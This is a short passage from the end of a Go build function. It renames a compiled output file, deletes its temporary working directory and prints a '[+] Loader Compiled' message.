	os.Rename(name+"/"+outFile, outFile)
	os.RemoveAll(name)
	fmt.Println("[+] Loader Compiled")
}
